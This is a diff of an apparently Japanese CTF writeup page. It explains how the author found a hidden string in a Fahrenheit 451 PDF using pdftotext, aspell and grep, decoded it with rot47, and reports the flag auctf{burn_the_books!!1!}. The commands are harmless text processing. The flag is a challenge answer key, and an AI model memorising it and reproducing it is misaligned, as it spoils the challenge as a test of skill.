 ま、そんな文句を言っても仕方ないので、目視以外のやり方で、どうやったら大量のテキストの中から怪しい文字列を見つけられたか、考えてみました。</p>
-
-<p>まずは、テキストを全部取り出します。
+<p>まずは、テキストを全部取り出します。</p>
 <pre>
 $ pdftotext Fahrenheit_451_Full_Text.pdf
-</pre></p>
-
+</pre>
 <p><br />
-案1：スペリングがおかしい単語を全部出してみるとか。
+案1：スペリングがおかしい単語を全部出してみるとか。</p>
 <pre>
 $ cat Fahrenheit_451_Full_Text.txt | aspell list | sort | uniq
 </pre>
-==&gt; これはダメでした。フラグの箇所がそもそも単語とみなされないため。</p>
-
+<p>==&gt; これはダメでした。フラグの箇所がそもそも単語とみなされないため。</p>
 <p><br />
-案2：10文字以上の単語を全部出してみるとか。
+案2：10文字以上の単語を全部出してみるとか。</p>
 <pre>
-$ cat Fahrenheit_451_Full_Text.txt | grep -o -w '\w{10,}' | sort | uniq
+$ cat Fahrenheit_451_Full_Text.txt | grep -o -w '\w\{10,\}' | sort | uniq
 </pre>
-==&gt; これもダメでした。前述のと同じ理由で、フラグの箇所がそもそも単語とみなされないため。</p>
-
+<p>==&gt; これもダメでした。前述のと同じ理由で、フラグの箇所がそもそも単語とみなされないため。</p>
 <p><br />
 案3：以下は、空白文字以外の文字が15個以上連続しているものの検索です。これでいけました。</p>
-
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1827,18 +1567,13 @@ sleeping-tablets,
 </span>:</code></pre></td></tr></table>
 </div>
 </div>
-
 <p><br />
 あとは、SUBSTITUTEということで、rotをいろいろ試すだけです。（rot47でした）</p>
-
 <p><br />
 Flag: <code>auctf{burn_the_books!!1!}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
-<hr />
-
+<hr>
 <p><br /><br />
 <br /><br /></p>
 
@@ -1865,7 +1600,11 @@ Flag: <code>auctf{burn_the_books!!1!}</code></p>
           <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
           </div>
       <nav class="post-nav">
-        
+        <a class="prev" href="https://captureamerica.github.io/writeups/post/umdctf_2020/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">UMDCTF 2020 Writeup</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
         <a class="next" href="https://captureamerica.github.io/writeups/post/tamuctf_2020/">
             <span class="next-text nav-default">TAMUctf 2020 Writeup</span>
             <span class="next-text nav-mobile">Next</span>
